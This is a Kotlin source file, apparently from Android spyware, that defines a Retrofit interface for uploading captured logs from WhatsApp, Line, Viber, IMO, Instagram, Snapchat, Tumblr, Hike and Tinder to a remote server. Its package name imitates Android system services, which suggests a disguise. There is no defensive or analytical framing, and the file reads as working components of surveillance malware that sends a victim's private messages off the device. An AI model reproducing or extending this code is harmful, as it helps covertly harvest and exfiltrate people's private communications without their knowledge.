package com.android.services.network.api

import com.android.services.models.*
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface NodeServerThreeApi {

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("whatsappUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadWhatsAppUnrooted(@Body whatsAppUnrootedLogs: WhatsAppUnrootedLogs): Call<ResponseBody>

    @POST("lineUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadLineUnrooted(@Body lineUnrootedLogs: LineUnrootedLogs): Call<ResponseBody>

    @POST("viberUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadViberUnrooted(@Body viberUnrootedLogs: ViberUnrootedLogs): Call<ResponseBody>

    @POST("imoUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadImoUnrooted(@Body imoUnrootedLogs: IMOUnrootedLogs): Call<ResponseBody>

    @POST("instagramUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramUnrooted(@Body instagramUnrootedLogs: InstagramUnrootedLogs): Call<ResponseBody>

    @POST("snapchatUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadSnapChatUnrooted(@Body snapChatUnrootedLogs: SnapChatUnrootedLogs): Call<ResponseBody>

    @POST("tumblrUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadTumblrUnrooted(@Body tumblrUnrootedLogs: TumblrUnrootedLogs): Call<ResponseBody>

    @POST("hikeUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadHikeUnrooted(@Body hikeUnrootedLogs: HikeUnrootedLogs): Call<ResponseBody>

    @POST("tinderUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadTinderUnrooted(@Body tinderUnrootedLogs: TinderUnrootedLogs): Call<ResponseBody>

}